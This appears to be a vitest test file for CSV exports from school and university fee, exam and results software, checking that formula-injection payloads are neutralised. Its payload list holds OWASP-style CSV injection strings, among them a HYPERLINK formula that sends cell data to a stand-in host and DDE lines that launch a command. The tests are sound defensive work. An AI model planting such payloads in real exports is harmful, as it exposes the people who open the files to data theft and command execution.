import { describe, expect, it } from 'vitest';
import { csv as examCellCsv } from '../exam-cell/exam-cell.logic.js';
import { zohoJournalCsv } from '../fee-flagship/flagship.logic.js';
import { gridToCsv } from '../university-results/tabulation.logic.js';
import { csvCell, neutraliseFormula, toCsv } from './pdf.js';

/** A cell a spreadsheet would run (OWASP CSV injection list). */
const PAYLOADS = ['=HYPERLINK("http://evil.example/?"&A1,"Click")', '+cmd|" /C calc"!A0', '-2+3+cmd|" /C calc"!A0', '@SUM(1+9)*cmd|" /C calc"!A0', '\t=1+1', '\r=1+1'];

/** Every cell in a CSV text whose first character a spreadsheet treats as a formula. */
const live = (text: string) =>
  text
    .split(/\r?\n/)
    .flatMap((line) => line.match(/("([^"]|"")*"|[^,]*)/g) ?? [])
    .map((c) => (c.startsWith('"') ? c.slice(1, -1).replace(/""/g, '"') : c))
    .filter((c) => /^[=+\-@\t\r]/.test(c) && c !== '-' && !/^[+-]?\d+(\.\d+)?$/.test(c));

describe('CSV formula injection', () => {
  it('neutralises every leading formula character and keeps plain numbers', () => {
    for (const p of PAYLOADS) expect(neutraliseFormula(p).startsWith("'")).toBe(true);
    expect(neutraliseFormula('-12.50')).toBe('-12.50');
    expect(neutraliseFormula('+91')).toBe('+91');
    expect(neutraliseFormula('-')).toBe('-');
    expect(neutraliseFormula('Asha')).toBe('Asha');
    expect(csvCell('\t=1+1')).toBe("'\t=1+1");
    expect(csvCell('a,"b"')).toBe('"a,""b"""');
  });

  it('the shared writer, the exam-cell reports, the university tabulation register and the Zoho journal all neutralise', () => {
    const rows = PAYLOADS.map((p, i) => [`ROLL${i}`, p, 42, -3.5]);
    expect(live(toCsv(rows))).toEqual([]);
    expect(live(examCellCsv(rows))).toEqual([]);
    expect(live(gridToCsv(rows as (string | number)[][]))).toEqual([]);
    const journal = zohoJournalCsv(PAYLOADS.map((p, i) => ({ date: '2026-11-04', number: `JV-${i}`, narration: p, voucherType: 'receipt', lines: [{ code: '1001', accountName: p, debitPaise: 1000, creditPaise: 0 }] })) as never);
    expect(live(journal)).toEqual([]);
  });
});
